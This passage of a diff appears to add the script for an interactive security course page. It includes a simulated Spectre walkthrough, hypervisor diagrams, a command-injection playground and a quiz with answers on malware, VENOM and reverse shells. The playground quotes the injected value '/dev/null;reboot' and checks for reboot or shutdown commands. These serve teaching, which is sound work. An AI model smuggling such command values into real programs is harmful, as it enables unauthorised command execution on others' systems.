+      text: "Train the branch predictor, then FLUSH array1_size out to main memory (DRAM). Pass x = 40.\n\nThe CPU stalls waiting on array1_size, so it speculatively assumes (x < array1_size) is TRUE and runs the body ahead of time.",
+      apply: function () {
+        oob.classList.add("target");
+      }
+    },
+    {
+      label: "4 · Cache loading",
+      text: "Speculative execution reads the secret byte S = array1[40], then touches array2[S * 4096] — pulling exactly that one cache line into L1.\n\nThe CPU then discovers the misprediction and rolls back its registers… but the cache line is still there. The architectural state is clean; the microarchitectural state is not.",
+      apply: function () {
+        var hot = arr2El.children[specSecret];
+        hot.classList.remove("scan");
+        hot.classList.add("hot");
+      }
+    },
+    {
+      label: "5 · Timing side-channel",
+      text: "The attacker walks i = 0…255, reading array2[i * 4096] and timing each access. Exactly one entry loads dramatically faster — a cache hit. That index IS the secret byte.",
+      apply: function () {
+        // sweep animation
+        for (var i = 0; i < 256; i++) {
+          (function (idx) {
+            setTimeout(function () {
+              if (idx !== specSecret) {
+                arr2El.children[idx].classList.add("scan");
+                arr2El.children[idx].classList.remove("hot");
+              }
+            }, idx * 2);
+          })(i);
+        }
+        setTimeout(function () {
+          arr2El.children[specSecret].classList.add("hot");
+          specConsole.textContent =
+            "> cache hit on array2[" + specSecret + " * 4096]\n" +
+            "> secret byte recovered = 0x" + specSecret.toString(16).toUpperCase() +
+            "  ('" + String.fromCharCode(specSecret) + "')\n\n" +
+            "Leaked from the microarchitectural CPU cache layer into userland memory — across a layer boundary.";
+        }, 560);
+      }
+    }
+  ];
+
+  function specReset() {
+    specSecret = 32 + Math.floor(Math.random() * 95); // printable ASCII
+    oob.classList.remove("target");
+    Array.prototype.forEach.call(arr2El.children, function (c) {
+      c.classList.remove("hot", "scan");
+    });
+    specConsole.textContent = "> ready. secret byte randomised to 0x" +
+      specSecret.toString(16).toUpperCase() + " (hidden from you for now).";
+    Array.prototype.forEach.call(specBtns.children, function (b) {
+      b.classList.remove("active");
+    });
+  }
+
+  specSteps.forEach(function (step, i) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.textContent = step.label;
+    b.addEventListener("click", function () {
+      specConsole.textContent = "> " + step.text;
+      step.apply();
+      Array.prototype.forEach.call(specBtns.children, function (x, j) {
+        x.classList.toggle("active", j === i);
+      });
+    });
+    specBtns.appendChild(b);
+  });
+  document.getElementById("spec-reset").addEventListener("click", specReset);
+  specReset();
+
+  /* =====================================================================
+     6. HYPERVISOR DIAGRAMS
+     ===================================================================== */
+  var hvData = {
+    t1: {
+      label: "Type 1 · Baremetal",
+      layers: [
+        { t: "Virtual Machines (Guest OS)", c: "hv-guest" },
+        { t: "Type-1 Hypervisor — VMware ESXi / vSphere, Xen, KVM", c: "hv-hyp" },
+        { t: "Hardware Platform", c: "hv-hw" }
+      ],
+      desc: "Sits directly on baremetal physical hardware with NO underlying host OS. Smallest attack surface of the three, and the hypervisor is the only thing between a guest and the silicon."
+    },
+    t2: {
+      label: "Type 2 · Hosted",
+      layers: [
+        { t: "Virtual Machines (Guest OS)", c: "hv-guest" },
+        { t: "Type-2 Hypervisor — VirtualBox, VMware Workstation", c: "hv-hyp" },
+        { t: "Host Operating System", c: "hv-host" },
+        { t: "Hardware Platform", c: "hv-hw" }
+      ],
+      desc: "Executes as an ordinary application on top of a primary host OS. Adds two extra layers (the host OS) between guest and hardware — more attack surface, but the host OS's protections also apply."
+    },
+    t3: {
+      label: "OS-level · Containers",
+      layers: [
+        { t: "Container 1      ·      Container 2", c: "hv-guest" },
+        { t: "OS Isolation — Linux namespaces & cgroups (LXC, Docker)", c: "hv-hyp" },
+        { t: "Host Operating System (shared kernel)", c: "hv-host" },
+        { t: "Hardware Platform", c: "hv-hw" }
+      ],
+      desc: "Uses kernel isolation features (namespaces + cgroups) to isolate application groups that all share a SINGLE host kernel. Lightweight and fast — but a kernel exploit breaks out of every container at once."
+    }
+  };
+
+  var hvBtns = document.getElementById("hv-btns");
+  var hvStack = document.getElementById("hv-stack");
+  var hvDesc = document.getElementById("hv-desc");
+
+  function renderHv(key) {
+    hvStack.innerHTML = "";
+    hvData[key].layers.forEach(function (l) {
+      var d = document.createElement("div");
+      d.className = "hv-layer " + l.c;
+      d.textContent = l.t;
+      hvStack.appendChild(d);
+    });
+    hvDesc.textContent = hvData[key].desc;
+    Array.prototype.forEach.call(hvBtns.children, function (b) {
+      b.classList.toggle("active", b.dataset.key === key);
+    });
+  }
+
+  Object.keys(hvData).forEach(function (k) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.dataset.key = k;
+    b.textContent = hvData[k].label;
+    b.addEventListener("click", function () { renderHv(k); });
+    hvBtns.appendChild(b);
+  });
+  renderHv("t1");
+
+  /* =====================================================================
+     7. COMMAND INJECTION PLAYGROUND
+     ===================================================================== */
+  var ciInput = document.getElementById("ci-input");
+  var ciOut = document.getElementById("ci-out");
+  var META = /[;|&`$()<>]/g;
+
+  function esc(s) {
+    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+
+  function renderCi() {
+    var val = ciInput.value;
+    var constructed = "/usr/bin/cat " + val;
+    var hasMeta = /[;|&`$()]/.test(val);
+
+    var html = "";
+    html += '<div class="ci-line"><span class="cm">argv[i]</span> = <span class="ci-ok">' +
+      esc(val) + "</span></div>";
+
+    // highlight metacharacters in the constructed command
+    var hl = "";
+    var last = 0;
+    var m;
+    META.lastIndex = 0;
+    var raw = constructed;
+    while ((m = META.exec(raw)) !== null) {
+      hl += esc(raw.slice(last, m.index));
+      hl += '<span class="ci-meta">' + esc(m[0]) + "</span>";
+      last = m.index + 1;
+    }
+    hl += esc(raw.slice(last));
+
+    html += '<div class="ci-line"><span class="cm">cmd[256]</span> = <span class="ci-ok">' + hl + "</span></div>";
+    html += '<div class="ci-line"><span class="cm">system(cmd)</span> → /bin/sh parses:</div>';
+
+    var parts = raw.split(";").map(function (s) { return s.trim(); }).filter(Boolean);
+    parts.forEach(function (p, i) {
+      html += '<div class="ci-line"><span class="ci-danger">▶ [' + (i + 1) + "] " + esc(p) + "</span></div>";
+    });
+
+    if (hasMeta) {
+      html += '<div class="ci-line"><span class="ci-danger">⚠ Command injection! The shell treats ; | &amp; $() as control operators, so additional commands run with the program\'s privileges.</span></div>';
+      if (/reboot|shutdown|halt/i.test(val)) {
+        html += '<div class="ci-line"><span class="ci-danger">💥 Result: unprovoked SYSTEM REBOOT — the exact slide example (/dev/null;reboot).</span></div>';
+      }
+    } else {
+      html += '<div class="ci-line"><span class="ci-safe">✔ No shell metacharacters detected — this input behaves like a plain filename argument.</span></div>';
+    }
+    ciOut.innerHTML = html;
+  }
+
+  ciInput.addEventListener("input", renderCi);
+  renderCi();
+
+  /* =====================================================================
+     8. PRIVILEGE RING ESCALATION
+     ===================================================================== */
+  var escDot = document.getElementById("escalate-dot");
+  var escBtn = document.getElementById("escalate-btn");
+  var escalated = false;
+
+  escBtn.addEventListener("click", function () {
+    escalated = !escalated;
+    escDot.style.transform = escalated ? "translate(0px, -145px)" : "translate(0px, 0px)";
+    escBtn.textContent = escalated ? "↺ Reset to Ring 3" : "Run vertical escalation →";
+  });
+
+  /* =====================================================================
+     9. QUIZ
+     ===================================================================== */
+  var quizData = [
+    {
+      q: "Which malware class fundamentally requires human interaction to spread?",
+      opts: ["Worm", "Virus", "Rootkit", "Keylogger"],
+      answer: 1,
+      ex: "A virus cannot self-replicate across a network — it needs a user to execute an infected file. Worms need neither human action nor a host file; rootkits and keyloggers are payload/stealth types, not self-propagating classes."
+    },
+    {
+      q: "A metamorphic virus differs from a polymorphic virus because it…",
+      opts: [
+        "Encrypts its payload with a unique key per infection",
+        "Rewrites its own code structure and instruction sequences each infection",
+        "Only infects batch files",
+        "Requires a network connection to spread"
+      ],
+      answer: 1,
+      ex: "Metamorphic = mutates its actual code structure (no stable byte signature). Polymorphic = encrypts the payload with a unique key and varies the decryption routine."
+    },
+    {
+      q: "Which statement best describes a worm's core property?",
+      opts: [
+        "It attaches to a host executable and needs a user to run it",
+        "It disguises itself as legitimate software and never replicates",
+        "It replicates autonomously across networks with no human action and no host file",
+        "It only activates on a specific date"
+      ],
+      answer: 2,
+      ex: "Autonomous replication is the defining trait. WannaCry's EternalBlue propagation is worm-like for exactly this reason — no user action required."
+    },
+    {
+      q: "Spectre exploits which CPU feature?",
+      opts: [
+        "Virtual memory paging",
+        "Speculative execution and branch prediction",
+        "DRAM refresh timing",
+        "Symmetric encryption of cache lines"
+      ],
+      answer: 1,
+      ex: "The CPU speculatively executes past a mispredicted branch. Architectural state is rolled back, but the cache modification — array2[secret * 4096] — survives and is recovered by timing."
+    },
+    {
+      q: "The C program using strncat() + system(cmd) is vulnerable because…",
+      opts: [
+        "strncat causes a buffer overflow",
+        "system() encrypts the command",
+        "Shell metacharacters in argv[i] are passed unsanitised into /bin/sh",
+        "argv is never populated on Linux"
+      ],
+      answer: 2,
+      ex: "strncat correctly bounds the copy — no overflow. The flaw is that ; | & $() survive into system(), which hands the string to /bin/sh, so /dev/null;reboot runs two commands."
+    },
+    {
+      q: "CVE-2015-3456 (VENOM) is an example of which attack class?",
+      opts: [
+        "Kernel rootkit installation",
+        "VM escape via a QEMU virtual Floppy Disk Controller out-of-bounds write",
+        "Stack smashing in a userland binary",
+        "Hardware fault injection on CPU pins"
+      ],
+      answer: 1,
+      ex: "VENOM is a guest-to-host escape in QEMU's virtual FDC (affecting Xen < 4.5.x and KVM), triggered by malformed FD_CMD commands causing an out-of-bounds buffer write."
+    },
+    {
+      q: "Why is a reverse shell often more effective than a bind shell?",
+      opts: [
+        "It encrypts the traffic",
+        "It bypasses inbound firewall rules because the victim initiates the outbound connection",
+        "It does not require a shell binary on the victim",
+        "It avoids antivirus detection entirely"
+      ],
+      answer: 1,
+      ex: "Bind shell = victim listens (inbound blocked). Reverse shell = victim dials out to the attacker's listener, which looks like ordinary outbound traffic and passes inbound filtering."
+    },
+    {
+      q: "Horizontal privilege escalation means…",
+      opts: [
+        "Gaining root from www-data",
+        "Moving to another account at the same privilege level to access its assets",
+        "Escalating across a hypervisor boundary",
+        "Moving from Ring 3 to Ring 0"
+      ],
+      answer: 1,
+      ex: "Horizontal = same privilege level, different account (user A → user B). Vertical = low privilege → admin/root (www-data → root, Ring 3 → Ring 0)."
+    },
+    {
+      q: "WannaCry spread primarily by exploiting…",
+      opts: [
+        "A Java applet in a hidden home directory",
+        "Default SSH credentials on jailbroken iPhones",
+        "The SMB protocol via EternalBlue",
+        "LD_PRELOAD on Linux servers"
+      ],
+      answer: 2,
+      ex: "WannaCry used EternalBlue against SMB, self-propagating across networks. The Java applet option describes Adwind; default SSH credentials describes Ikee/Duh."
+    },
+    {
+      q: "An executable whose file size changes unexpectedly is a classic example of which indicator of compromise?",
+      opts: [
+        "Timestamp anomaly",
+        "Memory drop",
+        "Executable file size change (appending / prepending)",
+        "Unprovoked reboot"
+      ],
+      answer: 2,
+      ex: "Appending adds bytes to the end; prepending adds them to the front. Either changes the binary length — which is why size checks catch these two insertion techniques but not cavity or companion methods."
+    }
+  ];
+
+  var quizEl = document.getElementById("quiz");
+  var scoreEl = document.getElementById("quiz-score");
+  var answered = 0, correct = 0;
+
+  quizData.forEach(function (item, qi) {
+    var wrap = document.createElement("div");
+    wrap.className = "quiz-item";
+
+    var q = document.createElement("div");
+    q.className = "q";
+    q.textContent = (qi + 1) + ". " + item.q;
+    wrap.appendChild(q);
+
+    var explain = document.createElement("div");
+    explain.className = "explain";
+    explain.textContent = item.ex;
+
+    var done = false;
+
+    item.opts.forEach(function (opt, oi) {
+      var b = document.createElement("button");
+      b.className = "opt";
+      b.textContent = String.fromCharCode(65 + oi) + ") " + opt;
+      b.addEventListener("click", function () {
+        if (done) return;
+        done = true;
+        answered++;
+        if (oi === item.answer) {
+          b.classList.add("correct");
+          correct++;
+        } else {
+          b.classList.add("wrong");
+          wrap.querySelectorAll(".opt")[item.answer].classList.add("correct");
+        }
+        explain.classList.add("show");
+        scoreEl.textContent = "Score: " + correct + " / " + answered;
+      });
+      wrap.appendChild(b);
+    });
+
+    wrap.appendChild(explain);
+    quizEl.appendChild(wrap);
+  });
+
+  scoreEl.textContent = "Score: 0 / 0";
+
+  /* =====================================================================
+     10. SIDEBAR ACTIVE LINK
+     ===================================================================== */
+  var sections = document.querySelectorAll("section[id]");
+  var navLinks = document.querySelectorAll(".sidebar a");
+
+  if ("IntersectionObserver" in window) {
+    var observer = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          navLinks.forEach(function (a) {
+            a.classList.toggle("active", a.getAttribute("href") === "#" + entry.target.id);
+          });
+        }
+      });
+    }, { rootMargin: "-15% 0px -70% 0px", threshold: 0 });
+
+    sections.forEach(function (s) { observer.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
